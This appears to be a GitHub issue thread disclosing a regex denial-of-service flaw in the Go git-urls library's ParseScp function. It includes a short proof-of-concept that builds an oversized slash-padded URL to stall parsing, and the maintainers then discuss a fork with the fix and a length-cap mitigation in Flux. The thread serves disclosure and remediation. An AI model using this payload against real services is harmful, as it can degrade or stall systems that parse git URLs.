|  | [VULNERABILITY] |
|  |  |
|  | - Regex Denial of Service |
|  |  |
|  | [DESCRIPTION] |
|  |  |
|  | The regex on line 35. inside urls.go is vulnerable to regex denial of service when a long input is provided inside |
|  | directory path of the git url. |
|  | It is possible to cause a 7s delay but only because the payload in the url was to long. Here is the PoC: |
|  |  |
|  | var payload = strings.Repeat("////", 19000000) //payload used, the number can be tweaked to cause 7 second delay |
|  | malicious\_url := "6en6ar@-:0////" + payload + "\" |
|  | begin := time.Now() |
|  | //u, err := giturls.ParseScp("remote\_username@10.10.0.2:/remote/directory")// normal git url |
|  | \_, err := giturls.ParseScp(malicious\_url) |
|  | if err != nil { |
|  | fmt.Errorf("[ - ] Error ->" + err.Error()) |
|  | } |
|  | //fmt.Println("[ + ] Url --> " + u.Host) |
|  | elapse := time.Since(begin) |
|  | fmt.Printf("Function took %s", elapse) |
|  |  |
|  | This vulnerbale regex causes the application to take longer time in parsing the input. |

There is no version 1.0.1 of the git-urls library.

Sorry, something went wrong.

Thanks for noticing. I updated the version in the description.

[@makkes](https://github.com/makkes) We've moved the repo to our organization and fixed the current issue. Please, check <https://github.com/chainguard-dev/git-urls>.

Sorry, something went wrong.

Thanks for the heads-up, [@hectorj2f](https://github.com/hectorj2f)! Is the goal to keep maintaining the lib there or just as long as a fix version hasn't been released upstream?

As a side note, we fixed it in Flux by [limiting the URL string we pass to git-urls to a 2048 bytes](https://github.com/fluxcd/notification-controller/pull/654).

Yes, we'll keep maintaining our copy independently of what upstream repo does. It currently looks unmaintained for the moment.

Sorry, something went wrong.
